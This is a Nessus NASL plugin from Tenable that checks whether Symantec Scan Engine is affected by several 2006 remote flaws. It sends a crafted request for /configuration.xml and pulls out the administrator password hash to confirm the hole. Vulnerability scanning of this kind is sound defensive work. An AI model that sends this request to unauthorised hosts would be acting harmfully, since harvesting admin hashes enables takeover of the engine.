#
# Copyright (C) 2006 Tenable Network Security 
#

 desc["english"] = "
Synopsis :

It is possible to take control of the remote scan engine.

Description :

The remote host appears to be running Symantec Scan Engine.

This version of Scan Engine is vulnerable to multiple flaws which may
allow a remote attacker to take control of the scan engine. Following
flaws are present:

- Fixed https certificate key
- Configuration file retrieval (with administrator password hash)
- Possibility to change the administrator password

Solution :

Upgrade to Scan Engine 5.1.0.7 or later.

Risk factor :

High / CVSS Base Score : 9.9
(AV:R/AC:L/Au:NR/C:C/I:C/A:C/B:N)";


if(description)
{
 script_id(21271);
 script_bugtraq_id(17637);
 script_version ("$Revision: 1.4 $");
 script_cve_id("CVE-2006-0230","CVE-2006-0231","CVE-2006-0232");

 name["english"] = "Symantec AntiVirus Scan Engine Multiple Remote Vulnerabilities";
 
 script_name(english:name["english"]);

 script_description(english:desc["english"]);
 script_summary(english:"Checks if Symantec Scan Engine is vulnerable");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8004);
 exit(0);
}

include ("http_func.inc");
include ("http_keepalive.inc");

port = get_http_port(default:8004);
if ( ! port )
  exit(0);

if (!get_port_state(port))
  exit(0);

r = http_get_cache(item:"/", port:port);
if ( (!r) || ("<title>Scan Engine</title>" >!< r) || ("com.symantec.gui" >!< r) )
  exit(0);


req = string("GET /configuration.xml\\ HTTP/1.0\r\n\r\n");

buf = http_keepalive_send_recv (port:port, data:req);
if (!buf) exit (0);


if (("<password value=" >< buf) && ("AutomaticSendVirusUpdatesEnabled" >< buf))
{
 line = egrep(pattern:".*password value=", string:buf);
 pass = ereg_replace (pattern:'.*<password value="([A-Z0-9]+)"/>.*', string:line, replace:"\1");
 report = string (desc["english"],
		"\n\nPlugin output :\n\n",
		"The administrator password hash (from the configuration file) is:\n\n",		
		pass);

 security_hole(data:report, port:port);
 exit(0);
}
